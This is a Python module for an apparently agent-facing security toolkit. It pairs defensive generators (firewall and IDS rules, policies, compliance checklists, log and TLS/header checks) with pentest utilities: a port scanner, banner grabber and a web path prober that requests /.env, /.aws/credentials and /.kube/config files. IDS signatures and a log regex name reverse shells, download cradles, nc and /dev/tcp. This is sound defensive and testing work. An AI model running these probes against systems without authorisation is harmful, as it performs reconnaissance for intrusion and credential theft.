"""
Ouroboros — Professional Cybersecurity Toolkit (20 tools).

Defense, pentesting, and consulting tools with real implementations.
"""

from __future__ import annotations

import hashlib
import json
import logging
import re
import socket
import ssl
import subprocess
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

from ouroboros.tools._adapter import adapt_tools

log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run(cmd: List[str], timeout: int = 30) -> str:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return "Error: command timed out"
    except Exception as e:
        return f"Error: {e}"


def _tcp_connect(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, socket.error, OSError):
        return False


def _tcp_banner(host: str, port: int, timeout: float = 4.0) -> str:
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            if port in (80, 8080, 8000, 8888):
                s.sendall(b"HEAD / HTTP/1.0\r\nHost: %b\r\n\r\n" % host.encode())
            elif port in (443, 8443):
                return "TLS-wrapped (use ssl_checker)"
            else:
                s.sendall(b"\r\n")
            return s.recv(1024).decode("utf-8", errors="replace").strip()
    except Exception as e:
        return f"Error: {e}"


def _resolve_host(hostname: str) -> Optional[str]:
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return None


# ===================================================================
# DEFENSE TOOLS (1-7)
# ===================================================================

def firewall_rules(
    action: str = "generate",
    policy: str = "web_server",
    allowed_ports: str = "22,80,443",
    blocked_ips: str = "",
    rate_limit: bool = True,
    firewall_type: str = "iptables",
) -> Dict[str, Any]:
    """Generate iptables or ufw firewall rules."""
    ports = [p.strip() for p in allowed_ports.split(",") if p.strip()]
    blocked = [ip.strip() for ip in blocked_ips.split(",") if ip.strip()]

    if firewall_type == "ufw":
        rules = ["ufw default deny incoming", "ufw default allow outgoing"]
        for ip in blocked:
            rules.append(f"ufw deny from {ip}")
        for p in ports:
            rules.append(f"ufw allow {p}/tcp")
        if rate_limit and "22" in ports:
            rules.remove("ufw allow 22/tcp")
            rules.append("ufw limit 22/tcp")
        rules.append("ufw enable")
    else:
        rules = [
            "*filter",
            ":INPUT DROP [0:0]",
            ":FORWARD DROP [0:0]",
            ":OUTPUT ACCEPT [0:0]",
            "-A INPUT -i lo -j ACCEPT",
            "-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
            "-A INPUT -s 127.0.0.0/8 ! -i lo -j DROP",
        ]
        for ip in blocked:
            rules.append(f"-A INPUT -s {ip} -j DROP")
        if rate_limit:
            rules.append("-A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH")
            rules.append("-A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP")
        for p in ports:
            rules.append(f"-A INPUT -p tcp --dport {p} -m state --state NEW -j ACCEPT")
        rules.append("-A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT")
        rules.append('-A INPUT -j LOG --log-prefix "IPTABLES_DROPPED: " --log-level 4')
        rules.append("-A INPUT -j DROP")
        rules.append("COMMIT")

    presets = {
        "web_server": {"description": "Standard web server: SSH + HTTP + HTTPS"},
        "database": {"description": "Database server: SSH only, DB ports from specific IPs"},
        "mail_server": {"description": "Mail: SSH + SMTP(25,587) + IMAP(993) + POP3(995)"},
    }

    return {
        "firewall_type": firewall_type,
        "policy": policy,
        "policy_info": presets.get(policy, {"description": "Custom policy"}),
        "rules": rules,
        "rules_text": "\n".join(rules),
        "total_rules": len(rules),
    }


def ids_rules(
    rule_type: str = "snort",
    attack_category: str = "web",
    custom_pattern: str = "",
    severity: str = "high",
) -> Dict[str, Any]:
    """Build Snort/Suricata IDS rules for common attack patterns."""
    sid_base = 1000001
    rules = []

    web_sigs = [
        ("SQL Injection — UNION", 'content:"UNION"; nocase; content:"SELECT"; nocase; distance:0;', "sql_injection"),
        ("SQL Injection — OR 1=1", "content:\"OR 1=1\"; nocase;", "sql_injection"),
        ("XSS — script tag", 'content:"<script"; nocase;', "xss"),
        ("XSS — onerror", 'content:"onerror"; nocase;', "xss"),
        ("Path Traversal", 'content:"../"; content:"../"; distance:0;', "path_traversal"),
        ("Command Injection — pipe", 'content:"|"; content:"/bin/"; distance:0;', "command_injection"),
        ("LFI — /etc/passwd", 'content:"/etc/passwd"; nocase;', "lfi"),
        ("Shellshock", 'content:"() {"; content:";"; distance:0;', "shellshock"),
    ]

    network_sigs = [
        ("Port Scan — SYN", "flags:S; threshold:type both, track by_src, count 20, seconds 10;", "scan"),
        ("ICMP Flood", "itype:8; threshold:type both, track by_src, count 50, seconds 5;", "dos"),
        ("DNS Zone Transfer", 'content:"|00 FC|"; offset:14;', "dns_abuse"),
    ]

    malware_sigs = [
        ("Reverse Shell — /bin/sh", 'content:"/bin/sh"; content:"-i"; distance:0;', "reverse_shell"),
        ("Base64 Encoded Payload", 'content:"base64"; nocase; pcre:"/[A-Za-z0-9+\\/]{50,}/";', "encoded_payload"),
        ("PowerShell Download Cradle", 'content:"powershell"; nocase; content:"downloadstring"; nocase; distance:0;', "malware_dl"),
    ]

    sigs_map = {"web": web_sigs, "network": network_sigs, "malware": malware_sigs}
    sigs = sigs_map.get(attack_category, web_sigs)

    prio_map = {"critical": 1, "high": 2, "medium": 3, "low": 4}
    prio = prio_map.get(severity, 2)

    proto_map = {"web": "tcp", "network": "ip", "malware": "tcp"}
    proto = proto_map.get(attack_category, "tcp")

    for i, (msg, content, classtype) in enumerate(sigs):
        sid = sid_base + i
        if rule_type == "suricata":
            rule = f'alert {proto} any any -> any any (msg:"{msg}"; {content} classtype:{classtype}; sid:{sid}; rev:1; priority:{prio}; metadata:created {datetime.now(timezone.utc).strftime("%Y-%m-%d")};)'
        else:
            rule = f'alert {proto} any any -> any any (msg:"{msg}"; {content} classtype:{classtype}; sid:{sid}; rev:1; priority:{prio};)'
        rules.append(rule)

    if custom_pattern:
        sid = sid_base + len(sigs)
        rule = f'alert tcp any any -> any any (msg:"Custom: {custom_pattern[:60]}"; content:"{custom_pattern}"; nocase; sid:{sid}; rev:1; priority:{prio};)'
        rules.append(rule)

    return {
        "rule_type": rule_type,
        "attack_category": attack_category,
        "severity": severity,
        "rules": rules,
        "rules_text": "\n".join(rules),
        "total_rules": len(rules),
    }


def security_policy(
    policy_type: str = "password",
    organization: str = "ACME Corp",
    strictness: str = "standard",
) -> Dict[str, Any]:
    """Generate security policy templates (password, access, incident response)."""
    policies = {}

    if policy_type in ("password", "all"):
        if strictness == "strict":
            min_len, max_age, history, lockout = 16, 60, 24, 3
        else:
            min_len, max_age, history, lockout = 12, 90, 12, 5

        policies["password_policy"] = {
            "title": f"{organization} Password Policy",
            "requirements": {
                "min_length": min_len,
                "require_uppercase": True,
                "require_lowercase": True,
                "require_digits": True,
                "require_special": True,
                "max_age_days": max_age,
                "password_history": history,
                "lockout_threshold": lockout,
                "lockout_duration_minutes": 30,
                "mfa_required": True,
            },
            "prohibited": [
                "Dictionary words",
                "Username or email variations",
                "Sequential characters (abc, 123)",
                "Repeated characters (aaa, 111)",
                "Previously breached passwords (check HaveIBeenPwned)",
            ],
            "enforcement": [
                "All systems must enforce password complexity at creation",
                "Passwords must be hashed with bcrypt/scrypt/Argon2 (never MD5/SHA1)",
                "Password reset requires MFA verification",
                "Service accounts use API keys rotated every 90 days",
            ],
        }

    if policy_type in ("access", "all"):
        policies["access_control_policy"] = {
            "title": f"{organization} Access Control Policy",
            "principles": [
                "Least privilege: grant minimum access needed",
                "Separation of duties: no single person controls critical processes",
                "Need-to-know: data access based on role requirements",
                "Defense in depth: multiple layers of access control",
            ],
            "requirements": [
                "Role-based access control (RBAC) for all systems",
                "Quarterly access reviews by department managers",
                "Immediate deprovisioning on employee termination",
                "Privileged access requires justification and approval",
                "Admin accounts separate from daily-use accounts",
                "VPN + MFA required for remote access",
                "Session timeout: 15 min inactive, 8 hours max",
            ],
        }

    if policy_type in ("incident_response", "all"):
        policies["incident_response_policy"] = {
            "title": f"{organization} Incident Response Plan",
            "phases": {
                "1_preparation": [
                    "Maintain IRT contact list and escalation matrix",
                    "Conduct tabletop exercises quarterly",
                    "Maintain forensic toolkit and jump bag",
                    "Document network baselines and asset inventory",
                ],
                "2_identification": [
                    "Monitor SIEM alerts 24/7",
                    "Classify incidents: P1 (critical) through P4 (informational)",
                    "Initial triage within 15 minutes of alert",
                    "Document timeline from first indicator",
                ],
                "3_containment": [
                    "Short-term: isolate affected systems (network segmentation)",
                    "Preserve forensic evidence before remediation",
                    "Deploy emergency firewall rules",
                    "Revoke compromised credentials immediately",
                ],
                "4_eradication": [
                    "Remove malware and backdoors",
                    "Patch exploited vulnerabilities",
                    "Reset all credentials on affected systems",
                    "Scan for lateral movement indicators",
                ],
                "5_recovery": [
                    "Restore from known-good backups",
                    "Monitor restored systems for 72 hours",
                    "Gradually re-enable services",
                    "Verify data integrity post-restore",
                ],
                "6_lessons_learned": [
                    "Conduct post-incident review within 5 business days",
                    "Update playbooks and detection rules",
                    "File regulatory notifications if required",
                    "Brief executive leadership on impact and improvements",
                ],
            },
        }

    return {"organization": organization, "strictness": strictness, "policies": policies}


def log_analyzer(
    log_content: str = "",
    log_type: str = "auth",
    log_file: str = "",
) -> Dict[str, Any]:
    """Parse auth.log/syslog content for suspicious patterns."""
    if log_file and not log_content:
        try:
            out = _run(["tail", "-n", "500", log_file], timeout=10)
            log_content = out
        except Exception as e:
            return {"error": f"Cannot read log file: {e}"}

    if not log_content:
        return {"error": "Provide log_content or log_file path"}

    lines = log_content.strip().split("\n")
    findings = {
        "failed_logins": [],
        "successful_root_logins": [],
        "brute_force_candidates": [],
        "suspicious_commands": [],
        "privilege_escalations": [],
        "ssh_events": [],
        "summary": {},
    }

    failed_by_ip: Dict[str, int] = {}
    failed_by_user: Dict[str, int] = {}

    patterns = {
        "failed_login": re.compile(r"(Failed password|authentication failure|FAILED LOGIN).*?from\s+(\d+\.\d+\.\d+\.\d+)", re.IGNORECASE),
        "failed_user": re.compile(r"(Failed password|invalid user)\s+(\S+)", re.IGNORECASE),
        "root_login": re.compile(r"(Accepted|session opened).*root", re.IGNORECASE),
        "priv_esc": re.compile(r"(sudo|su\b|pkexec).*?(COMMAND|session opened|executed)", re.IGNORECASE),
        "ssh_accept": re.compile(r"Accepted\s+(password|publickey)\s+for\s+(\S+)\s+from\s+(\d+\.\d+\.\d+\.\d+)", re.IGNORECASE),
        "ssh_invalid": re.compile(r"Invalid user\s+(\S+)\s+from\s+(\d+\.\d+\.\d+\.\d+)", re.IGNORECASE),
        "suspicious_cmd": re.compile(r"(wget|curl|chmod\s+777|nc\s+-|ncat|/dev/tcp|base64\s+-d|python.*-c)", re.IGNORECASE),
    }

    for line in lines:
        m = patterns["failed_login"].search(line)
        if m:
            ip = m.group(2)
            failed_by_ip[ip] = failed_by_ip.get(ip, 0) + 1
            findings["failed_logins"].append({"line": line.strip()[:200], "ip": ip})

        m = patterns["failed_user"].search(line)
        if m:
            user = m.group(2)
            failed_by_user[user] = failed_by_user.get(user, 0) + 1

        if patterns["root_login"].search(line):
            findings["successful_root_logins"].append(line.strip()[:200])

        if patterns["priv_esc"].search(line):
            findings["privilege_escalations"].append(line.strip()[:200])

        m = patterns["ssh_accept"].search(line)
        if m:
            findings["ssh_events"].append({
                "type": "accepted",
                "method": m.group(1),
                "user": m.group(2),
                "ip": m.group(3),
                "line": line.strip()[:200],
            })

        m = patterns["ssh_invalid"].search(line)
        if m:
            findings["ssh_events"].append({
                "type": "invalid_user",
                "user": m.group(1),
                "ip": m.group(2),
            })

        if patterns["suspicious_cmd"].search(line):
            findings["suspicious_commands"].append(line.strip()[:200])

    for ip, count in failed_by_ip.items():
        if count >= 5:
            findings["brute_force_candidates"].append({"ip": ip, "attempts": count, "severity": "high" if count > 20 else "medium"})

    findings["summary"] = {
        "total_lines_analyzed": len(lines),
        "total_failed_logins": len(findings["failed_logins"]),
        "total_root_logins": len(findings["successful_root_logins"]),
        "brute_force_sources": len(findings["brute_force_candidates"]),
        "suspicious_commands": len(findings["suspicious_commands"]),
        "privilege_escalations": len(findings["privilege_escalations"]),
        "risk_level": "critical" if findings["brute_force_candidates"] or findings["successful_root_logins"] else
                      "high" if len(findings["failed_logins"]) > 50 else
                      "medium" if len(findings["failed_logins"]) > 10 else "low",
        "top_offending_ips": sorted(failed_by_ip.items(), key=lambda x: x[1], reverse=True)[:10],
        "top_targeted_users": sorted(failed_by_user.items(), key=lambda x: x[1], reverse=True)[:10],
    }

    for key in ("failed_logins", "ssh_events", "suspicious_commands", "privilege_escalations"):
        if len(findings[key]) > 50:
            findings[key] = findings[key][:50]
            findings["summary"][f"{key}_truncated"] = True

    return findings


def ssl_checker(
    hostname: str,
    port: int = 443,
) -> Dict[str, Any]:
    """Check SSL certificate expiry, chain, and cipher configuration."""
    result: Dict[str, Any] = {"hostname": hostname, "port": port}

    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                protocol = ssock.version()

                not_before = datetime.strptime(cert["notBefore"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                not_after = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                now = datetime.now(timezone.utc)
                days_remaining = (not_after - now).days

                result["certificate"] = {
                    "subject": dict(x[0] for x in cert.get("subject", [])),
                    "issuer": dict(x[0] for x in cert.get("issuer", [])),
                    "serial_number": cert.get("serialNumber"),
                    "not_before": str(not_before),
                    "not_after": str(not_after),
                    "days_remaining": days_remaining,
                    "expired": days_remaining < 0,
                    "expiring_soon": 0 < days_remaining <= 30,
                    "san": [entry[1] for entry in cert.get("subjectAltName", [])],
                }

                result["connection"] = {
                    "protocol": protocol,
                    "cipher_suite": cipher[0] if cipher else None,
                    "cipher_bits": cipher[2] if cipher else None,
                }

                issues = []
                if days_remaining < 0:
                    issues.append({"severity": "critical", "issue": "Certificate has EXPIRED"})
                elif days_remaining <= 7:
                    issues.append({"severity": "critical", "issue": f"Certificate expires in {days_remaining} days"})
                elif days_remaining <= 30:
                    issues.append({"severity": "high", "issue": f"Certificate expires in {days_remaining} days"})

                if protocol and protocol in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                    issues.append({"severity": "critical", "issue": f"Insecure protocol: {protocol}"})

                weak_ciphers = ("RC4", "DES", "3DES", "MD5", "NULL", "EXPORT")
                if cipher and any(wc in cipher[0].upper() for wc in weak_ciphers):
                    issues.append({"severity": "high", "issue": f"Weak cipher: {cipher[0]}"})

                result["issues"] = issues
                result["overall_grade"] = (
                    "F" if any(i["severity"] == "critical" for i in issues) else
                    "C" if any(i["severity"] == "high" for i in issues) else
                    "A" if not issues else "B"
                )

    except ssl.SSLCertVerificationError as e:
        result["error"] = f"Certificate verification failed: {e}"
        result["overall_grade"] = "F"
    except Exception as e:
        result["error"] = str(e)

    return result


def security_headers(
    url: str,
) -> Dict[str, Any]:
    """Check a URL for security headers (CSP, HSTS, X-Frame-Options, etc.)."""
    result: Dict[str, Any] = {"url": url, "headers_found": {}, "missing": [], "issues": []}

    try:
        req = urllib.request.Request(url, method="HEAD")
        req.add_header("User-Agent", "SecurityHeadersChecker/1.0")
        with urllib.request.urlopen(req, timeout=15) as resp:
            headers = {k.lower(): v for k, v in resp.getheaders()}
    except Exception:
        out = _run(["curl", "-sI", "-L", "--max-time", "15", url], timeout=20)
        headers = {}
        for line in out.split("\n"):
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

    checks = {
        "strict-transport-security": {
            "severity": "high",
            "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
        },
        "content-security-policy": {
            "severity": "high",
            "recommendation": "Add: Content-Security-Policy: default-src 'self'",
        },
        "x-frame-options": {
            "severity": "medium",
            "recommendation": "Add: X-Frame-Options: DENY or SAMEORIGIN",
        },
        "x-content-type-options": {
            "severity": "medium",
            "recommendation": "Add: X-Content-Type-Options: nosniff",
        },
        "x-xss-protection": {
            "severity": "low",
            "recommendation": "Add: X-XSS-Protection: 0 (rely on CSP instead)",
        },
        "referrer-policy": {
            "severity": "medium",
            "recommendation": "Add: Referrer-Policy: strict-origin-when-cross-origin",
        },
        "permissions-policy": {
            "severity": "medium",
            "recommendation": "Add: Permissions-Policy: geolocation=(), camera=(), microphone=()",
        },
        "x-permitted-cross-domain-policies": {
            "severity": "low",
            "recommendation": "Add: X-Permitted-Cross-Domain-Policies: none",
        },
    }

    score = 100
    for header, info in checks.items():
        if header in headers:
            result["headers_found"][header] = headers[header]
            val = headers[header].lower()
            if header == "strict-transport-security":
                if "max-age=0" in val:
                    result["issues"].append({"header": header, "severity": "high", "issue": "HSTS max-age is 0 (disabled)"})
                    score -= 15
            elif header == "content-security-policy":
                if "unsafe-inline" in val:
                    result["issues"].append({"header": header, "severity": "medium", "issue": "CSP allows unsafe-inline"})
                    score -= 5
                if "unsafe-eval" in val:
                    result["issues"].append({"header": header, "severity": "high", "issue": "CSP allows unsafe-eval"})
                    score -= 10
        else:
            result["missing"].append({
                "header": header,
                "severity": info["severity"],
                "recommendation": info["recommendation"],
            })
            penalty = {"high": 15, "medium": 10, "low": 5}.get(info["severity"], 5)
            score -= penalty

    leaky = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]
    for h in leaky:
        if h in headers:
            result["issues"].append({
                "header": h,
                "severity": "low",
                "issue": f"Information disclosure: {h}: {headers[h]}",
            })
            score -= 3

    result["score"] = max(0, score)
    result["grade"] = (
        "A+" if score >= 95 else "A" if score >= 85 else "B" if score >= 70 else
        "C" if score >= 55 else "D" if score >= 40 else "F"
    )

    return result


def compliance_checklist(
    framework: str = "soc2",
    scope: str = "full",
) -> Dict[str, Any]:
    """Generate compliance checklists for SOC2, HIPAA, PCI-DSS, GDPR."""
    checklists: Dict[str, Any] = {}

    if framework in ("soc2", "all"):
        checklists["soc2"] = {
            "name": "SOC 2 Type II",
            "trust_service_criteria": {
                "security": [
                    {"id": "CC1.1", "control": "COSO environment — define security responsibilities", "status": "pending"},
                    {"id": "CC6.1", "control": "Logical access controls — restrict system access", "status": "pending"},
                    {"id": "CC6.2", "control": "Credentials — secure authentication mechanisms", "status": "pending"},
                    {"id": "CC6.3", "control": "Authorization — role-based access control", "status": "pending"},
                    {"id": "CC6.6", "control": "Boundary protection — firewall and network segmentation", "status": "pending"},
                    {"id": "CC7.1", "control": "Monitoring — detect anomalies and security events", "status": "pending"},
                    {"id": "CC7.2", "control": "Incident response — established IR procedures", "status": "pending"},
                    {"id": "CC8.1", "control": "Change management — controlled software changes", "status": "pending"},
                ],
                "availability": [
                    {"id": "A1.1", "control": "Capacity planning and performance monitoring", "status": "pending"},
                    {"id": "A1.2", "control": "Disaster recovery and business continuity", "status": "pending"},
                    {"id": "A1.3", "control": "Backup and restore procedures tested", "status": "pending"},
                ],
                "confidentiality": [
                    {"id": "C1.1", "control": "Data classification and handling procedures", "status": "pending"},
                    {"id": "C1.2", "control": "Encryption at rest and in transit", "status": "pending"},
                ],
            },
        }

    if framework in ("hipaa", "all"):
        checklists["hipaa"] = {
            "name": "HIPAA Security Rule",
            "safeguards": {
                "administrative": [
                    {"id": "164.308(a)(1)", "control": "Security management process — risk analysis", "status": "pending"},
                    {"id": "164.308(a)(3)", "control": "Workforce security — authorization and supervision", "status": "pending"},
                    {"id": "164.308(a)(4)", "control": "Information access management", "status": "pending"},
                    {"id": "164.308(a)(5)", "control": "Security awareness training", "status": "pending"},
                    {"id": "164.308(a)(6)", "control": "Security incident procedures", "status": "pending"},
                    {"id": "164.308(a)(7)", "control": "Contingency plan", "status": "pending"},
                ],
                "physical": [
                    {"id": "164.310(a)", "control": "Facility access controls", "status": "pending"},
                    {"id": "164.310(b)", "control": "Workstation use and security", "status": "pending"},
                    {"id": "164.310(d)", "control": "Device and media controls", "status": "pending"},
                ],
                "technical": [
                    {"id": "164.312(a)", "control": "Access control — unique user IDs, emergency access", "status": "pending"},
                    {"id": "164.312(b)", "control": "Audit controls — hardware/software/procedure logging", "status": "pending"},
                    {"id": "164.312(c)", "control": "Integrity controls — ePHI alteration/destruction", "status": "pending"},
                    {"id": "164.312(d)", "control": "Authentication — verify person seeking access", "status": "pending"},
                    {"id": "164.312(e)", "control": "Transmission security — encryption in transit", "status": "pending"},
                ],
            },
        }

    if framework in ("pci_dss", "all"):
        checklists["pci_dss"] = {
            "name": "PCI DSS v4.0",
            "requirements": [
                {"id": "Req 1", "control": "Install and maintain network security controls", "status": "pending"},
                {"id": "Req 2", "control": "Apply secure configurations to all components", "status": "pending"},
                {"id": "Req 3", "control": "Protect stored account data", "status": "pending"},
                {"id": "Req 4", "control": "Protect cardholder data with strong cryptography in transit", "status": "pending"},
                {"id": "Req 5", "control": "Protect all systems from malware", "status": "pending"},
                {"id": "Req 6", "control": "Develop and maintain secure systems and software", "status": "pending"},
                {"id": "Req 7", "control": "Restrict access by business need to know", "status": "pending"},
                {"id": "Req 8", "control": "Identify users and authenticate access", "status": "pending"},
                {"id": "Req 9", "control": "Restrict physical access to cardholder data", "status": "pending"},
                {"id": "Req 10", "control": "Log and monitor all access to system components", "status": "pending"},
                {"id": "Req 11", "control": "Test security of systems and networks regularly", "status": "pending"},
                {"id": "Req 12", "control": "Support information security with policies and programs", "status": "pending"},
            ],
        }

    if framework in ("gdpr", "all"):
        checklists["gdpr"] = {
            "name": "GDPR Compliance",
            "articles": [
                {"id": "Art 5", "control": "Principles: lawfulness, fairness, transparency, purpose limitation", "status": "pending"},
                {"id": "Art 6", "control": "Lawful basis for processing", "status": "pending"},
                {"id": "Art 7", "control": "Conditions for consent", "status": "pending"},
                {"id": "Art 12-14", "control": "Transparent information and communication (privacy notice)", "status": "pending"},
                {"id": "Art 15-20", "control": "Data subject rights (access, rectification, erasure, portability)", "status": "pending"},
                {"id": "Art 25", "control": "Data protection by design and by default", "status": "pending"},
                {"id": "Art 28", "control": "Processor requirements (DPA in place)", "status": "pending"},
                {"id": "Art 30", "control": "Records of processing activities", "status": "pending"},
                {"id": "Art 32", "control": "Security of processing (encryption, pseudonymization)", "status": "pending"},
                {"id": "Art 33-34", "control": "Breach notification (72-hour rule)", "status": "pending"},
                {"id": "Art 35", "control": "Data protection impact assessment", "status": "pending"},
                {"id": "Art 37-39", "control": "Data Protection Officer appointment", "status": "pending"},
            ],
        }

    return {"framework": framework, "scope": scope, "checklists": checklists}


# ===================================================================
# PENTESTING TOOLS (8-15)
# ===================================================================

def port_scan(
    target: str,
    ports: str = "21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017",
    timeout: float = 2.0,
) -> Dict[str, Any]:
    """TCP connect scan on a target using Python sockets."""
    results: Dict[str, Any] = {"target": target, "open": [], "closed": [], "filtered": []}

    ip = _resolve_host(target)
    if not ip:
        return {"error": f"Cannot resolve hostname: {target}"}
    results["resolved_ip"] = ip

    service_map = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL",
        1521: "Oracle", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
        5900: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
        8888: "HTTP-Alt", 9200: "Elasticsearch", 27017: "MongoDB",
    }

    port_list = []
    for part in ports.split(","):
        part = part.strip()
        if "-" in part:
            lo, hi = part.split("-", 1)
            port_list.extend(range(int(lo), int(hi) + 1))
        else:
            port_list.append(int(part))

    for p in port_list:
        try:
            with socket.create_connection((ip, p), timeout=timeout) as s:
                results["open"].append({
                    "port": p,
                    "service": service_map.get(p, "unknown"),
                    "state": "open",
                })
        except socket.timeout:
            results["filtered"].append({"port": p, "state": "filtered"})
        except ConnectionRefusedError:
            results["closed"].append(p)
        except OSError:
            results["filtered"].append({"port": p, "state": "filtered"})

    results["summary"] = {
        "open_count": len(results["open"]),
        "closed_count": len(results["closed"]),
        "filtered_count": len(results["filtered"]),
        "total_scanned": len(port_list),
    }

    return results


def banner_grab(
    target: str,
    ports: str = "21,22,25,80,110,143,443,3306,5432,8080",
    timeout: float = 5.0,
) -> Dict[str, Any]:
    """Grab service banners from open ports for service detection."""
    results: Dict[str, Any] = {"target": target, "banners": []}

    ip = _resolve_host(target)
    if not ip:
        return {"error": f"Cannot resolve hostname: {target}"}

    port_list = [int(p.strip()) for p in ports.split(",") if p.strip()]

    for p in port_list:
        if not _tcp_connect(ip, p, timeout=2.0):
            continue

        banner_text = ""
        service_info: Dict[str, Any] = {"port": p, "state": "open"}

        if p in (443, 8443, 993, 995, 465):
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with socket.create_connection((ip, p), timeout=timeout) as sock:
                    with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                        cert = ssock.getpeercert(binary_form=False)
                        if cert:
                            subj = dict(x[0] for x in cert.get("subject", []))
                            service_info["tls"] = {
                                "version": ssock.version(),
                                "cipher": ssock.cipher()[0] if ssock.cipher() else None,
                                "subject_cn": subj.get("commonName"),
                            }
                        if p in (443, 8443):
                            ssock.sendall(f"HEAD / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n".encode())
                            banner_text = ssock.recv(2048).decode("utf-8", errors="replace")
            except Exception as e:
                banner_text = f"TLS error: {e}"
        else:
            banner_text = _tcp_banner(ip, p, timeout=timeout)

        service_info["banner"] = banner_text[:500] if banner_text else "(no banner)"

        version_patterns = [
            (r"SSH-[\d.]+-(\S+)", "SSH"),
            (r"Server:\s*(.+?)[\r\n]", "HTTP Server"),
            (r"220[- ](.+?)[\r\n]", "FTP/SMTP Banner"),
            (r"(\d+\.\d+\.\d+[-\w]*)", "Version"),
        ]
        for pat, label in version_patterns:
            m = re.search(pat, banner_text)
            if m:
                service_info["detected_version"] = f"{label}: {m.group(1).strip()}"
                break

        results["banners"].append(service_info)

    results["total_services"] = len(results["banners"])
    return results


def dir_bruteforce(
    url: str,
    wordlist: str = "common",
    extensions: str = "",
    timeout: int = 5,
) -> Dict[str, Any]:
    """Check for common web paths and directories."""
    base = url.rstrip("/")
    results: Dict[str, Any] = {"target": base, "found": [], "errors": []}

    common_paths = [
        "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD", "/.git/config",
        "/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-includes/",
        "/admin/", "/admin/login", "/administrator/", "/login", "/dashboard",
        "/api/", "/api/v1/", "/api/v2/", "/graphql", "/swagger.json",
        "/api-docs", "/.well-known/security.txt",
        "/phpmyadmin/", "/pma/", "/server-status", "/server-info",
        "/.htaccess", "/.htpasswd", "/web.config", "/crossdomain.xml",
        "/backup/", "/backup.sql", "/backup.zip", "/db.sql",
        "/config.php", "/config.yml", "/config.json", "/settings.py",
        "/debug/", "/trace", "/actuator", "/actuator/health", "/actuator/env",
        "/console", "/elmah.axd", "/_profiler/",
        "/uploads/", "/static/", "/assets/", "/media/",
        "/.svn/entries", "/.DS_Store", "/Thumbs.db",
        "/package.json", "/composer.json", "/Gemfile",
        "/cgi-bin/", "/test/", "/temp/", "/tmp/", "/old/",
    ]

    if wordlist == "extended":
        common_paths.extend([
            "/node_modules/", "/vendor/", "/.env.local", "/.env.production",
            "/storage/", "/logs/", "/log/", "/error.log", "/access.log",
            "/info.php", "/phpinfo.php", "/test.php",
            "/xmlrpc.php", "/feed/", "/rss/",
            "/.aws/credentials", "/.docker/", "/Dockerfile",
            "/docker-compose.yml", "/.kube/config",
            "/health", "/healthz", "/ready", "/metrics",
        ])

    exts = [e.strip() for e in extensions.split(",") if e.strip()]

    paths_to_check = list(common_paths)
    if exts:
        for path in common_paths:
            if "." not in path.split("/")[-1]:
                for ext in exts:
                    paths_to_check.append(f"{path.rstrip('/')}.{ext.lstrip('.')}")

    for path in paths_to_check:
        full_url = base + path
        try:
            req = urllib.request.Request(full_url, method="GET")
            req.add_header("User-Agent", "Mozilla/5.0 (compatible; DirBrute/1.0)")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = resp.getcode()
                content_len = resp.headers.get("Content-Length", "unknown")
                content_type = resp.headers.get("Content-Type", "unknown")
                body_preview = resp.read(200).decode("utf-8", errors="replace")

                entry: Dict[str, Any] = {
                    "path": path,
                    "status": status,
                    "size": content_len,
                    "content_type": content_type,
                }

                sensitive_patterns = [".env", ".git", "backup", "config", "credentials", ".aws", ".kube"]
                if any(sp in path.lower() for sp in sensitive_patterns):
                    entry["severity"] = "critical"
                    entry["note"] = "Sensitive file/directory exposed"

                if ".git/HEAD" in path and "ref:" in body_preview:
                    entry["severity"] = "critical"
                    entry["note"] = "Git repository exposed"
                    entry["preview"] = body_preview[:100]

                results["found"].append(entry)

        except urllib.error.HTTPError as e:
            if e.code in (401, 403):
                results["found"].append({
                    "path": path,
                    "status": e.code,
                    "note": "Exists but access restricted",
                })
        except Exception:
            pass

    results["summary"] = {
        "paths_checked": len(paths_to_check),
        "found_count": len(results["found"]),
        "critical": sum(1 for f in results["found"] if f.get("severity") == "critical"),
    }

    return results


def subdomain_enum(
    domain: str,
    wordlist: str = "common",
) -> Dict[str, Any]:
    """DNS subdomain enumeration via brute-force resolution."""
